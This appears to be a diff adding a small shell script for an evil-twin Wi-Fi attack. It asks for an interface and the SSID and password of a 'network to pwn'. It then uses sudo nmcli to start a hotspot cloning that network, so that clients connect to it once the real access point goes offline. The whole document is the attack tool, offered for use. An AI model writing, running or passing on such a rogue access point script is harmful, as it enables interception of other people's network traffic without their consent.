@@ -1,0 +1,12 @@
+#!/bin/sh
+
+printf "enter net interface to use: "
+read interface
+
+printf "enter SSID of network to pwn: "
+read thing1
+
+printf "enter PASSWORD of network to pwn: "
+read thing2
+
+sudo nmcli dev wifi hotspot ifname $interface ssid $thing1 password $thing2 # this will create another AP with the same settings, in theory causing clients to connect to it once the real AP goes offline.
